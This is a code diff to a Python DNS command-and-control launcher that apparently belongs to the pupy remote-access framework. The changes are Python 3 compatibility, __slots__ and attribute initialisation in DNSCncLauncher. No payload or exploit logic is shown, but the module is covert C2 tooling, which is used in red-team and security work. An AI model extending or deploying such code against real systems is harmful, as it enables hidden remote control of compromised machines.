@@ -5,6 +5,7 @@ from __future__ import absolute_import
 from __future__ import division
 from __future__ import print_function
 from __future__ import unicode_literals
+
 __all__ = ['DNSCommandClientLauncher']
 
 from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
@@ -23,6 +24,7 @@ from threading import Thread, Lock
 
 from time import sleep
 
+import sys
 import socket
 import os
 
@@ -35,6 +37,9 @@ import pupy
 from network.lib import getLogger
 
 logger = getLogger('dnscnc')
+
+if sys.version_info.major > 2:
+    xrange = range
 
 
 class DNSCommandClientLauncher(DnsCommandsClient):
@@ -192,18 +197,33 @@ class DNSCommandClientLauncher(DnsCommandsClient):
 
         os._exit(0)
 
+
 class DNSCncLauncher(BaseLauncher):
     ''' Micro command protocol built over DNS infrastructure '''
+
+    __slots__ = (
+        'connect_on_bind_payload', 'dnscnc', 'exited', 'doh',
+        'ns', 'ns_timeout', 'qtype', 'pupy'
+    )
 
     name = 'dnscnc'
     credentials = ['DNSCNC_PUB_KEY_V2']
 
     def __init__(self, *args, **kwargs):
-        self.connect_on_bind_payload = kwargs.pop('connect_on_bind_payload', False)
+        self.connect_on_bind_payload = kwargs.pop(
+            'connect_on_bind_payload', False
+        )
+
         super(DNSCncLauncher, self).__init__(*args, **kwargs)
+
         self.dnscnc = None
         self.exited = False
         self.doh = False
+
+        self.ns = None
+        self.ns_timeout = None
+        self.qtype = None
+        self.pupy = None
 
     def parse_args(self, args):
         self.args = self.arg_parser.parse_args(args)
